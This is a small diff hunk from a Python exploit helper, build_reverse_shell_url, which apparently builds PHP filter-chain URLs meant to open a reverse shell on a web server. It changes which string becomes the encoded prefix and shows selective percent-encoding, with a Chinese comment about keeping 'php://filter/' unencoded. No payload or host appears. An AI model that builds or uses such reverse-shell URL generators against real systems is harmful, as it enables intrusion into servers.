@@ -83,7 +83,7 @@ def build_reverse_shell_url(base_url, ip, port, encode_chars=None, encode_chars2
         encoded_filter_content = ''.join(f'%{ord(c):02X}' if c in chars_to_encode else c for c in filter_content)
         encoded_prefix = php_filter_prefix + encoded_filter_content
     else:
-        encoded_prefix = prefix_template
+        encoded_prefix = filter_content
     
     # 第二次编码 - 同样确保 php://filter/ 不被编码
     if encode_chars2:
